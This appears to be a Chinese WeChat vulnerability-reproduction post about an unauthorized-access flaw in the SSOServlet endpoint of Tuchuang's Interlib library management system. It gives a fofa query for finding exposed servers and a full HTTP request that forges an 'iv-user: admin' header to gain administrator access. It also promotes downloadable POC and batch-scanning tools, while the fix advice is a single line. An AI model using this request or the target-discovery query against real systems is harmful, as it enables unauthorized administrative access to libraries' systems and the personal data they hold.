#  图创图书馆集群管理系统SSOServlet接口存在未授权访问漏洞   
南风徐来  南风漏洞复现文库   2024-05-06 22:56  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 图创图书馆集群管理系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
图书馆集群管理系统Interlib是新一代的图书馆自动化系统  
## 2.漏洞描述  
  
图书馆集群管理系统Interlib是新一代的图书馆自动化系统,采用开放的多层结构体系,基于Internet实现传统业务管理与海量数字资源管理的结合。图创图书馆集群管理系统SSOServlet接口存在未授权访问漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
图创图书馆集群管理系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDl5kVRAoQ3KialvtuamEziaJvpkKia4AQf9aeyT8rgFqHd6HK2cRDwFBbQg/640?wx_fmt=jpeg&from=appmsg "null")  
  
图创图书馆集群管理系统SSOServlet接口存在未授权访问漏洞  
## 4.fofa查询语句  
  
body="interlib"  
## 5.漏洞复现  
  
漏洞链接：http://xxx.xxx.xxx.xxx/interlib/common/SSOServlet  
  
漏洞数据包：  
```
GET /interlib/common/SSOServlet HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: */*
Connection: Keep-Alive
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
iv-user: admin
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlXoX1OdgdkWyPxwnBOaTHCQ0uwicZicQ73jUf5bCiarLHHMbGDbcPnmq0A/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现132 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlKoTaM13PDT72OJcNUPG47sGndvtaq2Ne0u9ZOWLTiah7LYib7muGk4ww/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlhhicwXxfBichsicPIOmDKiaSFpSEb2VVFkGYRwGT22H259jic7zcgDWQqdg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlqib6QC8F3ZecJEjnVAdXfU0qScicHyXcW3xMiaTDF2GLRXzyvFaW9IReg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlYJYtWBzibmrnyrj8zIX5iamiaicibZroibal7XdJKzNY3iadsacPFibp64F30A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDlWNUukv525HUEl2VlibFicqbaptr9jlQ3GkFNItnHlzsKlib6cswTFRppQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YVuPeMiaoe2TBMZwMspNUDle7z227KlYesibGXDdogkic4aVhmeLLOXIa4YXPznBPHJrPVFYx5zewPA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
联系厂商获取升级补丁修复漏洞  
## 8.往期回顾  
  
  
[泛微e-office系统UserSelect接口存在未授权访问漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486348&idx=1&sn=d432918c3ca047ca2d86b05d23cbe883&chksm=974b868ba03c0f9d74f2553ceed392dff8d314056dccf798398e00dfd4fce3e068dfeb49ce4e&scene=21#wechat_redirect)  
  
  
[时空智友企业流程化管控系统formservice存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486294&idx=2&sn=b90cb034d55c1f6a53708dc904f5c00c&chksm=974b8651a03c0f4756f06ef278357fcac5fd852c5cfd093957d18c5222194fa2861dd26a566e&scene=21#wechat_redirect)  
  
  
